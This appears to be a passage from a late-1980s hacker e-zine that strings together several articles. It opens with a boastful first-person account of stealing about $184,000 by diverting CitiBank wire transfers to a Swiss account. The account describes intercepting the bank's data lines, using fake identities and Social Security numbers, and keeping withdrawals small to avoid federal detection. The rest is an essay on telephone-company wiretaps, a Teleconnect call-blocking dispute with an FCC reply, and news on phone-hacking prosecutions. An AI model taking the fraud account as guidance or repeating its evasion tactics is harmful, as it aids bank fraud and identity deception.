, I nquire        C Type of account  Checking  Also S avings  I RA  M oney Market           T rust  W Other wire transfer ie.

We now needed to check out our theory about the Bank ID's, which I figured were the Federal Reserve number for the Bank.  Every bank in America that deals with the Federal Reserve System has such a number assigned to it  as do several European Banks .  I called up CitiBank and inquired about their Federal Reserve Number.  It was the number being sent by the computer.  With this information, we were ready to start.       I consulted an accountant friend of mine for information on Swiss or Bahamanian bank accounts.  He laughed and said that a  50,000 initial deposit was required to get a numbered account at most major Swiss banks.  I told him to obtain the forms necessary to start the ball rolling and I'd wire the money over to the bank as soon as I was told my account number.  This shook him up considerably, but he knew me well enough not to ask for details.  He did, however, remind me of his  1000 consulting fee.  A few days later he showed up at my townhouse with an account number, several transaction slips and paperwork.  Knowing that I was up to something shady, he had used one of his own false identities to set up the account.  He also raised his  fee  to  6500  which was, amazingly enough, the amount he owed on his wife's BMW .       My associate and I then flew to Oklahoma City to visit the hall of records to get new birth certificates.  With these, we obtained new State ID's and Social Security Numbers.  The next step was to set up bank accounts of our own. My associate took off to Houston and I went to Dallas.  We each opened new commercial accounts at three different banks as LOD Inc. with  1000 cash.       Early the next day, armed with one Swiss and six American accounts, we began our attack.  We rigged the CitiCorp computer to direct all of its data flow to a local Telenet node, high up in the hunt series.  Amazingly, it still allowed for connections from non 909 910 nodes.  We took turns sitting on the node, collecting the transmissions and returning the correct acknowledgments. By 12 30 we had  184,300 in electronic funds in  Limbo.   Next we turned off the data  forwarding  on the CitiCorp computer and took control of the host computer itself through the debug port to distribute the funds.  Using its data lines, we sent all the transactions, altering the intended bank destinations, to our Swiss account.       After I got the confirmation from the Swiss bank I immediately filled out six withdrawal forms and faxed them to the New York branch of the Swiss bank along with instructions on where the funds should be distributed.  I told the bank to send  7333 to each of our six accounts  this amount being small enough not to set off Federal alarms .  I did this for three consecutive days, leaving our Swiss account with  52,000.  I signed a final withdrawal slip and gave it to my accountant friend.       Over the next week we withdrew the  22,000 from each of our Dallas and Houston banks in lots of  5000 per day, leaving  1000 in each account when we were through.  We were now  66,000 apiece richer.       It will be interesting to see how the CitiCorp Internal Fraud Auditors and the Treasury Department sort this out.  There are no traces of the diversion, it just seems to have happened.  CitiBank has printed proof that the funds were sent to the correct banks, and the correct banks acknowledgment on the same printout.  The correct destination banks, however, have no record of the transaction.  There is record of CitiBank sending funds to our Swiss account, but only the Swiss have those records.  Since we were controlling the host when the transactions were sent, there were no printouts on the sending side.  Since we were not actually at a terminal connected to one of their line printers, no one should figure out to start contacting Swiss banks, and since CitiBank does this sort of thing daily with large European banks, they will be all twisted and confused by the time they find ours.  Should they even get to our bank, they will then have to start the long and tedious process of extracting information from the Swiss.  Then if they get the Swiss to cooperate, they will have a dead end with the account, since it was set up under the guise of a non entity.  The accounts in Dallas and Houston were also in fake names with fake Social Security Numbers  we even changed our appearances and handwriting styles at each bank.       I'm glad I'm not the one who will have the job of tracking me down, or even trying to muster up proof of what happened.  Now we won't have to worry about disposable income for awhile.  I can finish college without working and still live in relative luxury.  It's kind of weird having over six hundred  100 bills in a drawer, though.  Too bad we can't earn any interest on it!       Since the events described transpired, CitiBank has made their Banking     Transaction Ports all refuse collect connections.  Even by connecting     with an NUI they now respond    ENTER PASSWORD   .  C'est La Vie.

October 8, 1989        ...                            ...............................                         !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!   Most Central Office  CO  eavesdropping intercepts in a Bell Operating Company  BOC  CO are today performed using a modified Metallic Facility Termination  MFT  circuit pack which places about a 100,000 ohm isolated bridging impedance across the subscriber line.  Supervisory signaling is detected on the subscriber loop using a high impedance electronic circuit, and the signaling is repeated in an isolated fashion using the A and B leads of the repeating coil in the MFT to  reconstruct  a CO line for the benefit of monitoring apparatus.  The entire purpose of the above effort is to prevent any trouble or noise on the intercept line or monitoring apparatus from causing any trouble, noise or transmission impairment on the subject line.  Some BOCs may elect to use service observing apparatus to provide the necessary isolation and repeated loop supervisory signaling.  Less common are locally engineered variations which merely use an isolation amplifier from an MFT or other 4 wire repeater, and which provide no repeated supervisory signaling  which is not all that necessary, since voice activated recorders and DTMF signaling detectors can be used, and since dial pulses can be counted by playing a tape at slow speed .  Today, the use of a  bridge lifter  retardation coil for the purpose of connecting an eavesdropping intercept line is virtually non existent since they do not provide sufficient isolation and since they provide a fair amount of insertion loss without loop current on the  observing  side.  Bridge lifter coils are primarily intended for answering service intercept lines, and consist of a dual winding inductor which passes 20 Hz ringing and whose windings easily saturate when DC current flows.  Bridge lifter coils are used to minimize the loading effect  and consequent transmission impairment  of two subscriber loops on one CO line.  Bridge lifter coils provide a significant insertion loss at voice frequencies toward the idle loop  i.e., the loop in use will have DC current flow, saturating the inductor, and reducing its insertion loss to 1.0 dB or less.  Despite gadget advertised in magazines like The Sharper Image, the simple truth of the matter is that there is NO WAY for any person using ANY type of apparatus at the telephone set location to ascertain whether there is a properly installed eavesdropping device connected across their line in the CO. The only way such a determination can be made is through the cooperation of the telephone company.  For that matter, there is virtually no way for any person using any type of apparatus in their premises to ascertain if there is ANY type of eavesdropping apparatus installed ANYWHERE on their telephone line outside their premises, unless the eavesdropping apparatus was designed or installed in an exceptionally crude manner  not likely today .  Some types of eavesdropping apparatus may be located, but only with the full cooperation of the telephone company.  The sole capability of these nonsense gadgets is to ascertain if an extension telephone is picked up during a telephone call, which is hardly a likely scenario for serious eavesdropping!  These screw in the handset gadgets work by sensing the voltage across the carbon transmitter circuit, and using a control to null this voltage using a comparator circuit.  When a person makes a telephone call, the control is adjusted until the light just goes out.  If an extension telephone at the user's end is picked up during the call, the increased current drain of a second telephone set will decrease the voltage across the carbon transmitter circuit, unbalancing the voltage comparator circuit, and thereby causing the LED to light.  These voltage comparator  tap detectors  cannot even be left with their setpoint control in the same position, because the effective voltage across a subscriber loop will vary depending upon the nature of the call  except in the case of an all digital CO , and upon other conditions in the CO. Electromechanical and analog ESS CO's may present different characteristics to the telephone line, depending upon whether it is used at the time of   An originated intraoffice call  calling side of intraoffice trunk , an answered intraoffice call  called side of intraoffice trunk , an originated tandem call  interoffice tandem trunk , an originated toll call  toll trunk , or an answered tandem toll call  incoming tandem or toll trunk .  There is usually enough variation in battery feed resistance due to design and component tolerance changes on these different trunks to cause a variation of up to several volts measured at the subscriber end for a given loop and given telephone instrument.  Even more significant are variations in CO battery voltage, which can vary  within  normal limits   from 48 volts to slightly over 52 volts, depending upon CO load conditions.  50 to 51 volts in most CO's is a typical daily variation.  If anyone is curious, connect an isolated voltage recorder or data logger to a CO loop and watch the on hook voltage variations  in many CO's the resultant voltage vs 24 hour time curve will look just like the inverse of a busy hour graph from a telephone traffic engineering text!  In some all digital CO apparatus, the subscriber loop signaling is performed by a solid state circuit which functions as a constant current  or current limiting  device.  With such a solid state circuit controlling loop current, there is no longer ANY meaningful reference to CO battery voltage  i.e., one cannot even use short circuit loop current at the subscriber location to even estimate outside cable plant resistance.  To explode this myth even further, let's do a little Ohm's Law        1.  Assume a CO loop with battery fed from a dual winding A relay  or          line relay, ESS ferrod line scanner element, or whatever  having 200          ohms to CO battery and 200 ohms to ground.       2.  Assume a CO loop of 500 ohms  a pretty typical loop .       3.  Assume an eavesdropping device with a DC resistance of 100,000 ohms           this is still pretty crude, but I'm being generous with my example .       4.  Using some simple Ohm's law, the presence or absence of this          hypothetical eavesdropping device at the SUBSCRIBER PREMISES will          result in a voltage change of less than 0.5 volt when measured in the          on hook state.  This voltage change is much less than normal          variations of CO battery voltage.       5.  Using some simple Ohm's law, the presence or absence of this          hypothetical eavesdropping device at the CENTRAL OFFICE LOCATION will          result in a voltage change of less than 0.2 volt when measured in the          on hook state.  This voltage change is an order of magnitude less than          the expected normal variation of CO battery voltage!  Measuring voltage variations on a subscriber loop in an effort to detect a state of the art eavesdropping device is meaningless, regardless of resolution of a voltage measuring device, since the  signal  is in effect buried in the  noise .  Moving on to the subject of subscriber line impedance...  There is simply no way for any device located on the subscriber's premises to obtain any MEANINGFUL information concerning the impedance characteristics of the subscriber loop and whether or not anything  unusual  is connected at the CO  or for that matter, anywhere else on the subscriber loop .  There are a number of reasons why this is the case, which include but are not limited to        1.  The impedance of a typical telephone cable pair results from          distributed impedance elements, and not lumped elements.  Non loaded          exchange area cable  22 to 26 AWG   0.083 uF mile capacitance  is          generally considered to have a characteristic impedance of 600 ohms           it actually varies, but this is a good compromise figure .  Loaded          exchange area cable, such as H88 loading which are 88 mH coils spaced          at 6 kft intervals, is generally considered to have a a characteristic          impedance of 900 ohms  it actually varies between 800 and 1,200 ohms,          but 900 ohms is generally regarded as a good compromise figure for the          voice frequency range of 300 to 3,000 Hz .  What this means is that a          bridged impedance of 100,000 ohms located in the CO on a typical          subscriber loop will result in an impedance change measured at the          SUBSCRIBER LOCATION of 0.1  or less.  That's IF you could measure the          impedance change at the subscriber location.       2.  As a general rule of thumb, the impedance of an exchange area          telephone cable pair changes ONE PERCENT for every TEN DEGREES          Fahrenheit temperature change.  Actual impedance changes are a          function of the frequency at which the impedance is measured, but the          above rule is pretty close for the purposes of this discussion.       3.  Moisture in the telephone cable causes dramatic changes in its          impedance characteristics.  While this may appear obvious in the case          of pulp  i.e., paper  insulated conductors, it is also characteristic          of polyethylene  PIC  insulated conductors.  Only gel filled cable           icky PIC , which still represents only a small percentage of          installed cable plant, is relatively immune from the effects of          moisture.       4.  From a practical standpoint, it is extremely difficult to measure          impedance in the presence of the DC potential which is ALWAYS found on          a telephone line.  The subscriber has no means to remove the telephone          pair from the switching apparatus in the CO to eliminate this          potential.           Therefore, any attempt at impedance measurement will be subject to DC          current saturation error of any inductive elements found in an          impedance bridge.  The telephone company can, of course, isolate the          subscriber cable pair from the switching apparatus for the purpose of          taking a measurement    but the subscriber cannot.  In addition to the          DC current problem, there is also the problem of impulse and other          types of noise pickup on a connected loop which will impress errors in          the impedance bridge detector circuit.  Such noise primarily results          from the on hook battery feed, and is present even in ESS offices,          with ferrod scanner pulses being a good source of such noise.  While          one could possibly dial a telephone company  balance termination  test          line to get a quieter battery feed, this still leaves something to be          desired for any actual impedance measurements.       5.  Devices which connect to a telephone pair and use a 2 wire 4 wire          hybrid with either a white noise source or a swept oscillator on one          side and a frequency selective voltmeter on the other side to make a          frequency vs return loss plot provide impressive, but meaningless          data.  Such a plot may be alleged to show  changes  in telephone line          impedance characteristics.  There is actual test equipment used by          telephone companies which functions in this manner to measure 2 wire          Echo Return Loss  ERL , but the ERL measurement is meaningless for          localization of eavesdropping devices.       6.  It is not uncommon for the routing of a subscriber line cable pair to          change one or more times during its lifetime due to construction and          modification of outside cable plant.  Outside cable plant bridge taps           not of the eavesdropping variety  can come and go, along with back          taps in the CO to provide uninterrupted service during new cable plant          additions.  Not only can the  active  length of an existing cable pair          change by several percent due to construction, but lumped elements of          impedance can come and go due to temporary or permanent bridge taps.  The bottom line of the above is that one cannot accurately measure the impedance of a telephone pair while it is connected to the CO switching apparatus, and even if one could, the impedance changes caused by the installation of an eavesdropping device will be dwarfed by changes in cable pair impedance caused by temperature, moisture, and cable plant construction unknown to the subscriber.  About a year ago on a bulletin board I remember some discussions in which there was mention of the use of a time domain reflectometer  TDR  for localization of bridge taps and other anomalies.  While a TDR will provide a rather detailed  signature  of a cable pair, it has serious limitations which include, but are not limited to        1.  A TDR, in general, cannot be operated on a cable pair upon which there          is a foreign potential  i.e., a TDR cannot be used on a subscriber          cable pair which is connected to the CO switching apparatus.       2.  A TDR contains some rather sensitive circuitry used to detect the          reflected pulse energy, and such circuitry is extremely susceptible to          noise found in twisted pair telephone cable.  A TDR is works well with          coaxial cable and waveguide, which are in effect shielded transmission          lines.  The use of a TDR with a twisted cable pair is a reasonable          compromise provided it is a _single_ cable pair within one shield.          The use of a TDR with a twisted cable pair sharing a common shield          with working cable pairs is an invitation to interference by virtue of          inductive and capacitive coupling of noise from the working pairs.       3.  Noise susceptibility issues notwithstanding, most TDR's cannot be used          beyond the first loading coil on a subscriber loop since the loading          coil inductance presents far too much reactance to the short pulses          transmitted by the TDR.  There are one or two TDR's on the market          which claim to function to beyond ONE loading coil, but their          sensitivity is poor.  There is simply no device available to a telephone subscriber that without the cooperation of the telephone company which can confirm or deny the presence of any eavesdropping device at any point beyond the immediate premises of the subscriber.  I say  immediate premises of the subscriber  because one presumes that the subscriber has the ability to isolate the premises wiring from the outside cable plant, and therefore has complete inspection control over the premises wiring.  I have used the phrase  without the cooperation of the telephone company  several times in this article.  No voltage, impedance or TDR data is meaningful without knowing the actual circuit layout of the subscriber loop in question. Circuit layout information includes such data as exact length and guages of loop sections, detailed description of loading  if present , presence and location of multiples and bridge taps, calculated and measured resistance of the loop, loop transmission loss, etc.  There is NO way that a telephone company is going to furnish that information to a subscriber!  Sometimes it's even difficult for a government agency to get this information without judicial intervention.  Despite what I have stated in this article, you will see claims made by third parties as to the existence of devices which will detect the presence of telephone line eavesdropping beyond the subscriber's immediate premises.  With the exception of the trivial cases of serious DC current draw by an extension telephone or the detection of RF energy emitted by a transmitter, this just ain't so.  Companies like Communication Control Corporation  which advertises in various  executive  business publications  get rich by selling devices which claim to measure minute voltage and impedance changes on a telephone line    but consider those claims in view of the voltage changes due to CO battery variations and due to temperature changes in outside cable plant    and you should get the true picture.

Phrack Inc. Staff  The following article begins where the previous article left off                                                                                                                                                  November 17, 1988    Customer Service Teleconnect P.O. Box 3013 Cedar Rapids, IA  52406 9101  Dear Persons   I am writing in response to my October Teleconnect bill, due November 13, for  120.76.  As you can see, it has not yet been paid, and I would hope to delay payment until we can come to some equitable table resolution of what appears to be a dispute.   The records should show that I have paid previous bills responsibly.  Hence, this is neither an attempt to delay nor avoid payment.  My account number is  01 xxxx xxxxxx.  My user phone is  815 xxx xxxx.  The phone of record  under which the account is registered  is  815 xxx xxxx.  If possible, you might  flag  my bill so I will not begin receiving dunning notices until we resolve the problem.  I have several complaints.  One is the bill itself, the other is the service.  I feel my bill has been inflated because of the poor quality of the service you provide to certain areas of the country.  These lines are computer lines, and those over which the dispute occurs are 2400 baud lines.  Dropping down to 1200 baud does not help much.  As you can see from my bill, there are numerous repeat calls made to the same location within a short period of time.  The primary problems occured to the following locations   1. Highland, CA        714 864 4592 2. Montgomery, AL      205 279 6549 3. Fairbanks, AK       907 479 7215 4. Lubbock, TX         806 794 4362 5. Perrine, FL         305 235 1645 6. Jacksonville, FL    904 721 1166 7. San Marcos, TX      512 754 8182 8. Birmingham, AL      205 979 8409 9. N. Phoenix, AZ      602 789 9269      The Dark Side BBS by The Dictator   The problem is simply that, to these destinations, Teleconnect can simply not hold a line.  AT T can.  Although some of these destinations were held for a few minutes, generally, I cannot depend on TC service, and have more recently begun using AT T instead.  Even though it may appear from the records that I maintained some contact for several minutes, this time was useless, because I cold not complete my business, and the time was wasted.  An equitable resolution would be to strike these charges from my bill.  I would also hope that the calls I place through AT T to these destinations will be discounted, rather than pay the full cost.  I have enclosed my latest AT T bill, which includes calls that I made through them because of either blocking or lack of quality service.  If I read it correctly, no discount was taken off.  Is this correct   As you can see from the above list of numbers, there is a pattern in the poor quality service   The problem seems to lie in Western states and in the deep south.  I have no problem with the midwest or with numbers in the east.  I have been told that I should call a service representative when I have problems.  This, however, is not an answer for several reasons.  First, I have no time to continue to call for service in the middle of a project.  The calls tend to be late at night, and time is precious.  Second, on those times I have called, I either could not get through, or was put on hold for an indeterminable time.   Fourth, judging from comments I have received in several calls to Teleconnect's service representatives, these seem to be problems for which there is no immediate solution, thus making repeated calls simply a waste of time.  Finally, the number of calls on which I would be required to seek assistance would be excessive.  The inability to hold a line does not seem to be an occasional anomaly, but a systematic pattern that suggests that the service to these areas is, indeed, inadequate.  A second problem concerns the Teleconnect policy of blocking certain numbers. Blocking is unacceptable.  When calling a blocked number, all one receives is a recorded message that  this is a local call.   Although I have complained about this once I learned of the intentional blocking, the message remained the same. I was told that one number  301 843 5052  would be unblocked, and for several hours it was.  Then the blocking resumed.  A public utility simply does not have the right to determine who its customers may or may not call.  This constitutes a form of censorship.  You should candidly tell your customers that you must approve of their calls or you will not place them.  You also have the obligation to provide your customers with a list of those numbers you will  not service so that they will not waste their time attempting to call.  You might also change the message that indicates a blocked call by saying something  we don't approve of who you're calling, and won't let you call.   I appreciate the need to protect your customers.  However, blocking numbers is not appropriate.  It is not clear how blocking aids your investigation, or how blocking will eliminate whatever problems impelled the action.  I request the following   1.  Unblock the numbers currently blocked. 2.  Provide me with a complete list of the numbers you are blocking. 3.  End the policy of blocking.  I feel Teleconnect has been less than honest with its customers, and is a bit precipitous in trampling on rights, even in a worthy attempt to protect them from  abuses of telephone cheats.   However, the poor quality of line service, combined with the apparrent violation of Constitutional rights, cannot be tolerated.  Those with whom I have spoken about this matter are polite, but the bottom line is that they do not respond to the problem.  I would prefer to pay my bill only after we resolve this.  Cheerfully,   Name removed by request                                                                                                        ST ZMAG SPECIAL REPORT   by Jerry Cross                          reprinted from Vol.  28, 7 July, 1989                                                                                         TELECONNECT CALL BLOCKING UPDATE                           Ctsy  Genesee Atari Group   Background            At the beginning of last year one of my bbs users uploaded a file he found on another bbs that he thought I would be interested in.  It detailed the story of an Iowa bbs operator who discovered that Teleconnect, a long distance carrier, was blocking incoming calls to his bbs without his or the callers knowledge.  As an employee of Michigan Bell I was very interested.  I could not understand how a company could interfere with the transmissions of telephone calls, something that was completely unheard of with either AT T or Michigan Bell in the past.  The calls were being blocked, according to Teleconnect public relations officials, because large amounts of fraudulent calls were being placed through their system.  Rather than attempting to discover who was placing these calls, Teleconnect decided to take the easy  and cheap  way out by simply block access to the number they were calling.  But the main point was that a long distance company was intercepting phone calls.  I was very concerned.  I did some investigating around the Michigan area to see what the long distance carriers were doing, and if they, too, were intercepting or blocking phone calls.  I also discovered that Teleconnect was just in the process of setting up shop to serve Michigan.  Remember, too, that many of the former AT T customers who did not specify which long distance carrier they wanted at the time of the AT T breakup were placed into a pool, and divided up by the competing long distance companies.  There are a number of Michigan users who are using certain long distance carriers not of their choice.  My investigation discovered that Michigan Bell and AT T have a solid, computer backed security system that makes it unnecessary for them to block calls.  MCI, Sprint, and a few other companies would not comment or kept passing me around to other departments, or refused to comment about security measures.  I also discussed this with Michigan Bell Security and was informed that any long distance company that needed help investigating call fraud would not only receive help, but MBT would actually prepare the case and appear in court for prosecution!  My calls to Teleconnect were simply ignored.  Letters to the public service commission, FCC, and other government departments were also ignored.  I did, however, get some cooperation from our U.S. Representative Dale Kildee, who filed a complaint in my name to the FCC and the Interstate Commerce Commission. What follows is their summary of an FCC investigation to Mr. Kildee's office.                                                                                   Dear Congressman Kildee   This is in further response to your October 18, 1988 memorandum enclosing correspondence from Mr. Gerald R. Cross, President of the Genesee Atari Group in Flint, Michigan concerning a reported incidence of blocking calls from access to Curt Kyhl's Stock Exchange Bulletin Board System in Waterloo, Iowa by Teleconnect, a long distance carrier.  Mr. Cross, who also operates a bulletin board system  bbs , attaches information indicating that Teleconnect blocked callers from access via its network to Mr. Kyhl's BBS number in an effort to prevent unauthorized use of its customers' long distance calling authorization codes by computer  hackers.   Mr. Cross is concerned that this type of blocking may be occurring in Michigan and that such practice could easily spread nationwide, thereby preventing access to BBSs by legitimate computer users.  On November 7, 1988, the Informal Complaints Branch of the Common Carrier Bureau directed Teleconnect to investigate Mr. Cross' concerns and report the results of its investigation to this Commission.  Enclosed, for your information, is a copy of Teleconnect's December 7, 1988 report and its response to a similar complaint filed with this Commission by Mr. James Schmickley.  In accordance with the commission's rules, the carrier should have forwarded a copy of its December 7, 1988 report to Mr. Cross at the same time this report was filed with the Commission.  I apologize for the delay in reporting the results of our investigation to your office.  Teleconnect's report states that it is subject to fraudulent use of its network by individuals who use BBSs in order to unlawfully obtain personal authorization codes of consumers.  Teleconnect also states that computer  hackers  employ a series of calling patterns to access a carrier's network in order to steal long distance services.  The report further states that Teleconnect monitors calling patterns on a 24 hour basis in an effort to control, and eliminate when possible, code abuse.  As a result of this monitoring, Teleconnect advises that its internal security staff detected repeated attempts to access the BBS numbers in question using multiple seven digit access codes of legitimate Teleconnect customers.  These calling patterns, according to Teleconnect, clearly indicated that theft of telecommunications services was occurring.  The report states that Teleconnect makes a decision to block calls when the estimated loss of revenue reaches at least  500.  Teleconnect notes that blocking is only initiated when signs of  hacking  and other unauthorized usage are present, when local calls are attempted over its long distance network or when a customer or other carrier has requested blocking of a certain number. Teleconnect maintains that blocking is in compliance with the provisions of Section A.20.a.04 of Teleconnect's Tariff FCC No.  3 which provides that service may be refused or disconnected without prior notice by Teleconnect for fraudulent unauthorized use.  The report also states that Teleconnect customers whose authorizations codes have been fraudulently used are immediately notified of such unauthorized use and are issued new access codes.  Teleconnect further states that while an investigation is pending, customers are given instructions on how to utilize an alternative carrier's network by using  10XXX  carrier codes to access interstate or intrastate communications until blocking can be safely lifted.  Teleconnect maintains that although its tariff does not require prior notice to the number targeted to be blocked, it does, in the case of a BBS, attempt to identify and contact the Systems Operator  SysOp , since the SysOp will often be able to assist in the apprehension of an unauthorized user.  The report states that with regard to Mr. Kyle's Iowa BBS, Teleconnect was unable to identify Mr. Kyle as the owner of the targeted number because the number was unlisted and Mr. Kyhl's local carrier was not authorized to and did not release any information to Teleconnect by which identification could be made.  The report also states that Teleconnect attempted to directly access the BBS to determine the identity of the owner but was unable to do so because its software was incompatible with the BBS.  Teleconnect states that its actions are not discriminatory to BBSs and states that it currently provides access to literally hundreds of BBSs around the country.  The report also states that Teleconnect's policy to block when unauthorized use is detected is employed whether or not such use involves a BBS.  Teleconnect advises that when an investigation is concluded or when a complaint is received concerning the blocking, the blocking will be lifted, as in the case of the Iowa BBS.  However, Teleconnect notes that blocking will be reinstated if illegal  hacking  recurs.  Teleconnect advises that it currently has no ongoing investigations within the State of Michigan and therefore, is not presently blocking any BBSs in Michigan.  However, Teleconnect states that it is honoring the request of other carriers and customers to block access to certain numbers.  The Branch has reviewed the file on this case.  In accordance with the Commission's rules for informal complaints it appears that the carrier's report is responsive to our Notice.  Therefore, the Branch, on its own motion, is not prepared to recommend that the Commission take further action regarding this matter.                                                                                   This letter leaves me with a ton of questions.  First, let's be fair to Teleconnect.  Long distance carriers are being robbed of hundreds of thousands of dollars annually by  hackers  and must do something to prevent it.  However, call blocking is NOT going to stop it.  The  hacker  still has access to the carrier network and will simply start calling other numbers until that number, too, is blocked, then go on to the next.  The answer is to identify the  hacker  and put him out of business.  Teleconnect is taking a cheap, quick fix approach that does nothing to solve the problem, and hurts the phone users as a whole.  They claim that their customers are able to use other networks to complete their calls if the number is being blocked.  What if other networks decide to use Teleconnect's approach   You would be forced to not only keep an index of those numbers you call, but also the long distance carrier that will let you call it!  Maybe everyone will block that number, then what will you do   What if AT T decided to block calls   Do they have this right too   And how do you find out if the number is being blocked   In the case of Mr. Kyhl's BBS, callers were given a recording that stated the number was not in service.  It made NO mention that the call was blocked, and the caller would assume the service was disconnect.  While trying to investigate why his calls were not going through, Mr. James Schmickley placed several calls to Teleconnect before they finally admitted the calls were being blocked!  Only after repeated calls to Teleconnect was the blocking lifted.  It should also be noted that Mr. Kyhl's bbs is not a pirate bbs, and has been listed in a major computer magazine as one of the best bbs's in the country.  As mentioned before, MBT will work with the long distance carriers to find these  hackers.   I assume that the other local carriers would do the same.  I do not understand why Teleconnect could not get help in obtaining Mr. Kyhl's address.  It is true the phone company will not give out this information, but WILL contact the customer to inform him that someone needs to contact him about possible fraud involving his phone line.  If this policy is not being used, maybe the FCC should look into it.  Call blocking is not restricted to BBSs, according to Teleconnect.  They will block any number that reaches a  500 fraud loss.  Let's say you ran a computer mail order business and didn't want to invest in a WATS line.  Why should an honest businessman be penalized because someone else is breaking the law   It could cost him far more the  500 from loss of sales because of Teleconnect's blocking policy.  Teleconnect also claims that  they are honoring the request of other carriers and customers to block access to certain numbers.   Again, MBT also has these rules.  But they pertain to blocking numbers to  certain numbers  such as dial a porn services, and many 900 numbers.  What customer would ever request that Teleconnect block incoming calls to his phone   And it is an insult to my intelligence for Teleconnect to claim they could not log on to Mr. Kyhl's BBS.  Do they mean to say that with hundreds of thousands of dollars in computer equipment, well trained technicians, and easy access to phone lines, that they can't log on to a simple IBM bbs   Meanwhile, here I sit with a  50 Atari 800xl and  30 Atari modem and I have no problem at all accessing Mr. Kyhl's bbs!  What's worse, the FCC  the agency in charge of regulating data transmission equipment , bought this line too!  Incredible!!!  And finally, I must admit I don't have the faintest idea what Section A.20.a.04 of Teleconnect's Tariff FCC No. 3 states, walk into your local library and ask for this information and you get a blank look from the librarian.  I know, I tried!  However, MBT also has similar rules in their tariffs.  Teleconnect claims that the FCC tariff claims that  service may be refused or disconnected without prior notice by Teleconnect for fraudulent, unauthorized use .  This rule, as applied to MBT, pertains ONLY to the subscriber.  If an MBT customer were caught illegally using their phone system then MBT has the right to disconnect their service.  If a Teleconnect user wishes to call a blocked number, and does so legally, how can Teleconnect refuse use to give them service   This appears to violate the very same tarriff they claim gives them the right to block calls!  I have a few simple answers to these questions.  I plan, once again, to send out letters to the appropriate agencies and government representatives, but I doubt they will go anywhere without a mass letter writing campaign from all of you.  First, order that long distance companies may not block calls without the consent of the customer being blocked.  Every chance should be given to him to assist in identifying the  hacker,  and he should not be penalized for other people's crimes.  There should also be an agency designated to handle appeals if call blocking is set up on their line.  Currently, there is no agency, public service commission, or government office  except the FCC  that you can complain to, and from my experience trying to get information on call blocking I seriously doubt that they will assist the customer.  Next, order the local phone carriers to fully assist and give information to the long distance companies that will help identify illegal users of their systems.  Finally, order the Secret Service to investigate illegal use of long distance access codes in the same manner that they investigate credit card theft.  These two crimes go hand in hand.  Stiff fines and penalties should be made mandatory for those caught stealing long distance services.

U.S. District Judge Mariana R. Pfaelzer said Leonard Mitchell DiCicco, of unincorporated suburban Calabasas, had been helpful in the case, in which he reported Mitnick to officers at Digital Equipment Corporation in Massachusetts.  Mitnick has admitted he stole a DEC computer security program and electronically brought it to California.  Pfaelzer gave DiCicco, age 23, until November 1 to come up with a detailed proposal for his community service.   I favor the handicapped, older people, something which is out in the community,  Pfaelzer said.  DiCicco pleaded guilty in July to one count of aiding and abetting the interstate transportation of stolen property.  He admitted that in 1987 he let Mitnick, age 25, of suburban Panorama City, use his office computer at Voluntary Plan Administrators in Calabasas to break into the DEC system.  Mitnick pleaded guilty and was sentenced in July to one year in prison and six months in a community treatment program aimed at breaking his  addiction  to computer hacking.  Under a plea agreement with the government, DiCicco pleaded guilty in exchange for a promise that he would not be prosecuted for any of the other instances of computer hacking he and Mitnick carried out.  He said after Thursday's  October 12  court appearance that he would like to put his computer talents to use to help others.  Assistant U.S. Attorney James Asperger did not object to giving DiCicco community service rather than a prison term, saying    I think Mr. DiCicco's cooperation in this case was essential to the prosecution of both Mr. Mitnick and himself.  He is certainly lower in culpability than Mr. Mitnick.

And the police said the 16 year old San Gabriel boy used that time to put a sophisticated high tech spin on age old teenage telephone pranks by tying up police emergency lines from Hayward, California to Cedar Rapids, Iowa, and harassing other people, all from what he thought was the safety of his home Commodore 64 computer.  The calls that jammed Hayward police and Alameda County sheriff's lines were potentially dangerous, but officials said that no emergency was neglected because of them.  This is the way he got his kicks, but he had most of us just absolutely crazed,  said Connie Bullock, security director for one of the long distance companies that suffered thousands of dollars of losses.  The boy, who police would not identify because of his age, is  was  scheduled to be arraigned October 16th in Los Angeles County Juvenile Court for making telephone bomb threats, fraudulently obtaining long distance telephone service, interfering with a police officer and making harassing phone calls.   Our goal is to get him on probation so we can doctor him for the next couple of years,  said Sgt. Bernie Kammer, of the Los Angeles County sheriff's computer crime detail.   Hopefully, he may be one of the guys who sends the next space capsule up,  Kammer said.  The hacker, who has used handles like  Kent O'Brien,  surfaced sometime last October, said Bullock, director of network security for ComSystems Incorporated, a Van Nuys based long distance company.  Bullock learned that someone had tapped into the electronic phone mail system of a Cedar Rapids based long distance company using ComSystems lines.  A security officer for the Iowa company began receiving harassing and threatening calls, some at home in the middle of the night, she said.  The hacker became good at cracking home answering machine codes in the Southern California area and possibly elsewhere, and changed several outgoing messages, she said.  He also broke into the phone mail system at Sears administrative office in Hayward, California and called workers there, she said.  He even commandeered one phone mail box and had other people leave messages.  He would also make anonymous calls or just let the phone ring in the middle of the night and hang up.  He phoned in bomb threats to his old high school and a fast food restaurant, Kammer said.  In all cases, he used a computer synthesizer to disguise his voice, Kammer said.  And he routed the calls in ways to make tracing impossible.  Then he started calling Cedar Rapids police emergency 911 lines, bombarding dispatchers in the middle of the night with a series of computer assisted calls that would tie up the lines for hours.  He would make small talk and ask about the weather, said Cedar Rapids Detective Stan McCurg.  The boy could call up five or six other people, hold their lines captive and route the calls to police, McCurg said.   The scary thing is he had the capability to screw you over and you couldn't do anything about it,  McCurg said.  Police say the boy pulled the same trick on the Alameda County Sheriff's office, San Francisco police and the Los Angeles County sheriff's office in Crescrenta Valley.  The calls did not cause any safety problems, but there was always that potential, Kammer said.  The big break came after the boy started calling Hayward police dispatchers in late February.  At first, the dispatchers played along, trying to find out who and where the boy was while the boy gave false clues to throw them off.   It was like, 'Catch me if you can,'  said Hayward Detective Dennis Kutsuris.  On March 2, dispatchers kept him talking from 8 10 a.m. to 1 20 p.m., long enough to trace the call to his San Gabriel home.  That night, police served a search warrant and found the boy in bed talking on the phone using his synthesizer.  The hacker was a lonely boy who dropped out of high school because it didn't challenge him, but had passed his general education equivalency exam and was taking courses from a community college, according to Kammer and Bullock.  Police seized the computer equipment, but formal charges were not filed until last month because of the complex followup investigation, Kammer said.  Bullock said her company lost about  71,000 worth of calls, plus four angered customers.  Kammer said although police believe the loss could be  hundreds of thousands  of dollars, they can only prove the loss of  2000 in court.  In the meantime, Hayward police received another call September 6th from a computer synthesized voice that they feel came from the boy.  Kammer said a relative had given the boy another computer, but they have no proof that he was back to his old tricks.  Still, that incident, along with Cedar Rapids police reports will be used for a probation report, Kammer said.  Bullock said the case was intriguing at first, but became frustrating 